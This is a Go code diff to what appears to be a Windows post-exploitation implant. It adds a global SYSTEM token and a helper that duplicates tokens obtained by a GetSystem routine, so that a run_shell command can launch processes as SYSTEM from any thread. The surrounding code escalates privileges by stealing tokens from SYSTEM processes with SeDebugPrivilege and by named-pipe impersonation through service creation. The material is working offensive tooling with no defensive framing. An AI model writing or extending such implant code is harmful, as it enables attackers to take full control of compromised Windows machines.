@@ -12,6 +12,12 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+// gSystemToken holds the primary SYSTEM token obtained by GetSystem so that
+// shell commands can use CreateProcessWithTokenW regardless of which goroutine
+// (OS thread) executes them — thread impersonation is per-thread and would be
+// lost as soon as the task goroutine switches threads.
+var gSystemToken windows.Handle
+
 var (
 	procLookupPrivilegeValueW      = windows.NewLazySystemDLL("advapi32.dll").NewProc("LookupPrivilegeValueW")
 	procAdjustTokenPrivileges      = windows.NewLazySystemDLL("advapi32.dll").NewProc("AdjustTokenPrivileges")
@@ -232,6 +238,20 @@ func gsT2NamedPipeService() (windows.Token, string, error) {
 	return tok, fmt.Sprintf("T2 (named pipe + service '%s' → %s)", svcName, owner), nil
 }
 
+// storePrimaryToken duplicates tok as a primary token and stores it in
+// gSystemToken so run_shell can use CreateProcessWithTokenW on any thread.
+func storePrimaryToken(tok windows.Token) {
+	var hPrim windows.Token
+	if err := windows.DuplicateTokenEx(tok, windows.TOKEN_ALL_ACCESS, nil,
+		windows.SecurityImpersonation, windows.TokenPrimary, &hPrim); err == nil {
+		old := gSystemToken
+		gSystemToken = windows.Handle(hPrim)
+		if old != 0 {
+			windows.CloseHandle(old)
+		}
+	}
+}
+
 // GetSystem attempts privilege escalation to SYSTEM using multiple techniques.
 // Returns descriptive output and whether SYSTEM was obtained.
 func GetSystem() (string, bool) {
@@ -240,6 +260,7 @@ func GetSystem() (string, bool) {
 	sb.WriteString("[*] T1: SeDebugPrivilege + token steal from SYSTEM process…\n")
 	tok1, desc1, err1 := gsT1TokenSteal()
 	if err1 == nil {
+		storePrimaryToken(tok1)
 		windows.CloseHandle(windows.Handle(tok1))
 		sb.WriteString("[+] SYSTEM — " + desc1 + "\n")
 		return sb.String(), true
@@ -249,6 +270,7 @@ func GetSystem() (string, bool) {
 	sb.WriteString("[*] T2: Named pipe impersonation via service creation…\n")
 	tok2, desc2, err2 := gsT2NamedPipeService()
 	if err2 == nil {
+		storePrimaryToken(tok2)
 		windows.CloseHandle(windows.Handle(tok2))
 		sb.WriteString("[+] SYSTEM — " + desc2 + "\n")
 		return sb.String(), true
